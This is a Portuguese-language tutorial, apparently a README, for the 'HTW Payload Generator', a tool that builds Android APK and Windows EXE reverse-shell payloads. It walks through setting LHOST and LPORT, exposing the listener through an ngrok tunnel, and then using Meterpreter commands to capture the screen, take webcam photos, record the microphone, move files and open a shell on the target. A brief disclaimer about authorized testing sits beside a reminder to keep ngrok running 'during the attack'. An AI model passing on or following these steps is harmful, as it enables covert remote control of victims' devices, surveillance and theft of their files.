# 🔧 Tutorial Completo HTW Payload Generator

```bash
# ======================
# 🚀 COMO USAR A FERRAMENTA
# ======================

# 1️⃣ INICIANDO O PROGRAMA
python3 htw.py

# 2️⃣ MENU PRINCIPAL
# ----------------------------------
# [01] Quick Setup (Configuração rápida)
# [02] Custom (Configuração manual)
# [00] Sair
# ----------------------------------

# 3️⃣ MODO QUICK SETUP (RECOMENDADO PARA INICIANTES)
# - Escolha [01]
# - Selecione:
#    [1] Para Android (.apk)
#    [2] Para Windows (.exe)
# - Digite nome do arquivo (ex: payload.apk)
# - Pronto! O payload será gerado automaticamente

# 4️⃣ MODO CUSTOM (PARA USUÁRIOS AVANÇADOS)
# - Escolha [02]
# - Defina:
#   • LHOST (IP do seu servidor)
#   • LPORT (Porta de escuta)
#   • Nome do arquivo de saída
# - O payload será criado e o listener iniciado

# ======================
# 🌐 USANDO COM NGROK
# ======================

# 1️⃣ EM OUTRO TERMINAL:
./ngrok tcp 4444

# 2️⃣ ANOTE OS DADOS:
# Exemplo: tcp://0.tcp.sa.ngrok.io:12345
# • LHOST: 0.tcp.sa.ngrok.io
# • LPORT: 12345

# 3️⃣ NO HTW:
# Use esses dados no modo Custom

# ======================
# 💻 COMANDOS ÚTEIS (METERPRETER)
# ======================

screenshot      # Captura tela do dispositivo
webcam_snap     # Tira foto da webcam
record_mic      # Grava áudio do microfone
download [file] # Baixa arquivos do alvo
upload [file]   # Envia arquivos para o alvo
shell           # Acessa terminal do dispositivo

# ======================
# ⚠️ IMPORTANTE
# ======================
# • Use apenas para testes autorizados
# • Não use para atividades ilegais
# • Mantenha o Ngrok rodando durante o ataque
